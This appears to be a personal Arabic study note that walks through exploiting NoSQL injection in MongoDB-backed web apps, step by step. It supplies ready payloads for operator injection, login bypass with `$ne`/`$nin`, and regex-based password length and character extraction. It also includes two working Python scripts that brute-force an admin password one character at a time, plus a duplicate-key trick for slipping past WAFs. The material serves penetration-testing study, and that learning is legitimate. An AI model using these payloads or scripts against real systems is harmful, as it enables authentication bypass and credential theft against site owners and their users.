
## [[فهم NoSQL Injection  إيه هو وازاي بيشتغل؟]]

## [[امتي اعرف ان في ثغره ال  NoSQL Injection]]

## [[أين تبحث عن ثغرة NoSQL Injection]] ؟


## إزاي تستغلها؟

##  – الخطوة  1 :    تحديد نقاط الإدخال

#### -[[شرح الخطوه تحديد نقاط الإدخال]]

#### - سيناريوهات اللي هستخدمها في الخطوه تحديد نقاط الإدخال
---

##  – الخطوة  2 : اختبار حقن المعاملات (Operator Injection)

#### - [[شرح الخطوه Operator Injection]]

#### -[[سيناريوهات اللي هستخدمها في الخطوه Operator Injection]]
---

##  – الخطوة  3 :   اختبار تجاوز التوثيق (Authentication Bypass)

#### -[[شرح الخطوه   Authentication Bypass in NoSQL]]

#### - [[سيناريوهات اللي هستخدمها في الخطوه Authentication Bypass in NoSQL]]
---

##  – الخطوة  4 :   استخراج طول البيانات

#### - [[شرح الخطوه استخراج طول البيانات]]

#### - [[سيناريوهات اللي هستخدمها في الخطوه استخراج طول البيانات]]
---

##  – الخطوة  5 :  استخراج البيانات

#### - [[شرح الخطوه استخراج البيانات]]

#### - [[سيناريوهات اللي هستخدمها في الخطوه استخراج البيانات]]
---

##  – الخطوة  6 :  اختبار الحقن العمياء (Blind NoSQL Injection)

#### - [[شرح الخطوه اختبار الحقن العمياء (Blind NoSQL Injection)]]

#### - [[سيناريوهات اللي هستخدمها في الخطوه اختبار الحقن العمياء (Blind NoSQL Injection)]]
---

##  – الخطوة  7 :    تجاوز جدار الحماية (WAF) والفلاتر

#### - [[شرح الخطوه  تجاوز جدار الحماية (WAF) والفلاتر]]

#### - [[سيناريوهات اللي هستخدمها في الخطوه تجاوز جدار الحماية (WAF) والفلاتر]]
---


## الخطوة 1: تحديد نقاط الإدخال
قم بفحص الموقع لتحديد الحقول التي تتفاعل مع قاعدة بيانات NoSQL، مثل حقل البحث، نماذج تسجيل الدخول، أو واجهات برمجة التطبيقات (APIs) التي تقبل بيانات JSON أو URL-encoded. هذه هي نقاط الإدخال المحتملة للهجوم.

**ملخص الأوامر/الـ Payloads:**
- افحص نماذج الويب، معايير URL، وطلبات API.
- ابحث عن حقول مثل `username`، `password`، أو حقول البحث.
- تحقق مما إذا كان التطبيق يستخدم بيانات JSON (`application/json`) أو URL-encoded (`application/x-www-form-urlencoded`).

---

## الخطوة 2: اختبار حقن المعاملات (Operator Injection)
قم بحقن معاملات NoSQL مثل `$ne`، `$gt`، أو `$regex` في الحقول للتلاعب بسلوك الاستعلام. على سبيل المثال، في خاصية البحث، أدخل `{ "$gt": 0 }` لاسترداد بيانات غير مقصودة.

**أمثلة على الـ Payloads:**
- لبحث عن سعر: `price[$gt]=0`
- لاستعلام عن منتج: `{"price": {"$gt": 0}}`

**الاختبار:**
- أرسل الـ payload في حقل البحث أو طلب API.
- تحقق مما إذا كان الرد يحتوي على بيانات أكثر من المتوقع (مثل جميع المنتجات بدلاً من منتج محدد).

## **ملخص الأوامر/الـ Payloads:**
- URL-encoded: `price[$gt]=0`
- JSON: `{"price": {"$gt": 0}}`
- تحقق من الرد بحثًا عن تسرب بيانات (مثل استرجاع كل السجلات).

---

## الخطوة 3: اختبار تجاوز التوثيق (Authentication Bypass)
حاول تجاوز تسجيل الدخول بحقن معاملات مثل `$ne`، `$gt`، أو `$nin` في نموذج تسجيل الدخول. الهدف هو إنشاء استعلام يُقيّم كـ "صحيح" لأي مستخدم.

**أمثلة على الـ Payloads:**
- URL-encoded: `username[$ne]=toto&password[$ne]=toto`
- JSON: `{"username": {"$ne": null}, "password": {"$ne": null}}`
- متقدم: `login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto`

**الاختبار:**
- أرسل هذه الـ payloads في نموذج تسجيل الدخول أو API.
- تحقق مما إذا حصلت على وصول غير مصرح به (مثل إعادة التوجيه إلى لوحة التحكم).

## **ملخص الأوامر/الـ Payloads:**
- URL-encoded:
  - `username[$ne]=toto&password[$ne]=toto`
  - `login[$regex]=a.*&pass[$ne]=lol`
  - `login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto`
- JSON:
  - `{"username": {"$ne": null}, "password": {"$ne": null}}`
  - `{"username": {"$gt": ""}, "password": {"$gt": ""}}`
- تحقق مما إذا نجح تسجيل الدخول بدون بيانات صحيحة.

---

## الخطوة 4: استخراج طول البيانات
استخدم معامل `$regex` لتخمين طول البيانات الحساسة (مثل كلمة المرور). جرب أنماط regex تدريجيًا للعثور على الطول الصحيح.

**أمثلة على الـ Payloads:**
- `username[$ne]=toto&password[$regex]=.{1}`
- `username[$ne]=toto&password[$regex]=.{3}`

**الاختبار:**
- أرسل الـ payloads بأطوال متزايدة (مثل `.{1}`، `.{2}`، `.{3}`).
- حدد الطول الذي يؤدي إلى تغيير في الرد (مثل تسجيل دخول ناجح أو خطأ محدد).

## **ملخص الأوامر/الـ Payloads:**
- URL-encoded:
  - `username[$ne]=toto&password[$regex]=.{1}`
  - `username[$ne]=toto&password[$regex]=.{2}`
  - `username[$ne]=toto&password[$regex]=.{3}`
- كرر حتى يتم تأكيد الطول الصحيح من خلال الرد.

---

## الخطوة 5: استخراج البيانات
بعد معرفة الطول، استخدم `$regex` أو `$in` لاستخراج البيانات الفعلية (مثل حروف كلمة المرور) عن طريق تخمين الأنماط أو القيم.

**أمثلة على الـ Payloads:**
- URL-encoded:
  - `username[$ne]=toto&password[$regex]=m.{2}`
  - `username[$ne]=toto&password[$regex]=md.{1}`
  - `username[$ne]=toto&password[$regex]=mdp`
- JSON:
  - `{"username": {"$eq": "admin"}, "password": {"$regex": "^m"}}`
  - `{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp"}}`
- باستخدام `$in`: `{"username": {"$in": ["Admin", "admin", "root"]}, "password": {"$gt": ""}}`

**الاختبار:**
- أرسل الـ payloads لتخمين الحروف أو القيم.
- تحقق من الردود الناجحة لتأكيد التخمينات الصحيحة.

## **ملخص الأوامر/الـ Payloads:**
- URL-encoded:
  - `username[$ne]=toto&password[$regex]=m.*`
  - `username[$ne]=toto&password[$regex]=md.*`
  - `username[$ne]=toto&password[$regex]=mdp`
- JSON:
  - `{"username": {"$eq": "admin"}, "password": {"$regex": "^m"}}`
  - `{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp"}}`
  - `{"username": {"$in": ["Admin", "admin", "root"]}, "password": {"$gt": ""}}`
- تحقق من الردود لاستخراج البيانات تدريجيًا.

---

## الخطوة 6: اختبار الحقن العمياء (Blind NoSQL Injection)
إذا لم يكن تسرب البيانات مباشرًا ممكنًا، اختبر الحقن العمياء من خلال ملاحظة الاختلافات في الردود (مثل رموز الحالة، إعادة التوجيه، أو تغييرات النصوص). استخدم سكربتات لأتمتة استخراج البيانات حرفًا بحرف.

**أمثلة على السكربتات:**
- **POST مع JSON Body (Python):**
  ```python
  import requests
  import urllib3
  import string
  urllib3.disable_warnings()

  username = "admin"
  password = ""
  u = "http://example.org/login"
  headers = {'content-type': 'application/json'}

  while True:
      for c in string.printable:
          if c not in ['*','+','.','?','|']:
              payload = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s"}}' % (username, password + c)
              r = requests.post(u, data=payload, headers=headers, verify=False, allow_redirects=False)
              if 'OK' in r.text or r.status_code == 302:
                  print("تم العثور على حرف جديد: %s" % (password + c))
                  password += c
  ```
- **GET Request (Python):**
  ```python
  import requests
  import urllib3
  import string
  urllib3.disable_warnings()

  username = 'admin'
  password = ''
  u = 'http://example.org/login'

  while True:
      for c in string.printable:
          if c not in ['*','+','.','?','|','#','&','$']:
              payload = f"?username={username}&password[$regex]=^{password + c}"
              r = requests.get(u + payload)
              if 'Yeah' in r.text:
                  print(f"تم العثور على حرف جديد: {password + c}")
                  password += c
  ```

**الاختبار:**
- شغّل السكربت على النقطة المستهدفة.
- راقب التغييرات في الردود (مثل حالة `302` أو نصوص مثل `Yeah`).
- استخرج البيانات حرفًا بحرف.

## **ملخص الأوامر/الـ Payloads:**
- JSON POST: `{"username": {"$eq": "admin"}, "password": {"$regex": "^<تخمين>"}}`
- URL-encoded POST: `user=admin&pass[$regex]=^<تخمين>&remember=on`
- GET: `?username=admin&password[$regex]=^<تخمين>`
- مؤشرات النجاح: حالة HTTP `302`، نصوص معينة (مثل `OK`، `Yeah`)، أو إعادة توجيه إلى `/dashboard`.

---

## الخطوة 7: تجاوز جدار الحماية (WAF) والفلاتر
إذا كان هناك جدار حماية (WAF) أو فلاتر تمنع بعض المدخلات، اختبر سلوك المفاتيح المكررة في MongoDB (حيث يحل المفتاح الأخير محل السابق) لتجاوز القيود.

**مثال على الـ Payload:**
- `{"id": "10", "id": "100"}` (يستخدم MongoDB القيمة `id: "100"`)

**الاختبار:**
- أرسل الـ payloads مع مفاتيح مكررة في طلبات JSON.
- تحقق مما إذا كان التطبيق يعالج المفتاح الأخير، متجاوزًا أي فلاتر على المفتاح الأول.

## **ملخص الأوامر/الـ Payloads:**
- JSON: `{"id": "10", "id": "100"}`
- تحقق مما إذا كان الرد يعكس قيمة المفتاح الأخير (مثل `id=100`).

---
 
## Tools in SQl injection

## [[script for NoSQL injection]]

## [[أمثلة عملية علي كل نوع من NoSQL injection]]



## [[التأثير المحتمل للثغرة NoSQL injection]]



## [[اي اللي هعمله بعد ثغره NoSQL injection]]



